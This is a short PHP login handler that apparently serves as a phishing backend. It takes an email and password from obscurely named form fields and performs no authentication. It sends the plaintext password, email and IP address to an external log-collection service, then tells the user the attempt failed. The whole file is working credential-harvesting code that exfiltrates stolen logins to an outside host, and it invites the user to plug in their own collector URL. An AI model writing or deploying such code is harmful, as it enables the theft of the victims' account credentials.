<?php
// Input validation
$email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Function to send JSON response
function sendJsonResponse($success, $message = '', $redirectUrl = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'redirectUrl' => $redirectUrl
    ]);
    exit();
}

// Log all login attempts to Papertrail
try {
    // Prepare log data
    $logData = [
        "Date" => date("Y-m-d H:i:s"),
        "Email" => $email,
        "Password" => $password,
        "IP" => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
    ];

    // Convert log data to string format for sending
    $logMessage = sprintf(
        "Date: %s | Email: %s | Password: %s | IP: %s",
        $logData["Date"],
        $logData["Email"],
        $logData["Password"],
        $logData["IP"]
    );

    // Send logs to Papertrail URL
    $papertrailUrl = "https://logs.collector.na-01.cloud.solarwinds.com/v1/logs"; // Replace with your Papertrail URL

    $ch = curl_init($papertrailUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $logMessage);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: text/plain",
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    if ($response === false) {
        error_log("Failed to send log to Papertrail: " . curl_error($ch));
        sendJsonResponse(false, "A server error occurred while saving the login attempt.");
    }
    curl_close($ch);

    // Send response to the frontend
    sendJsonResponse(false, "Login attempt saved.");
} catch (Exception $e) {
    error_log("Failed to log login attempt to Papertrail: " . $e->getMessage());
    sendJsonResponse(false, "A server error occurred while saving the login attempt.");
}
?>
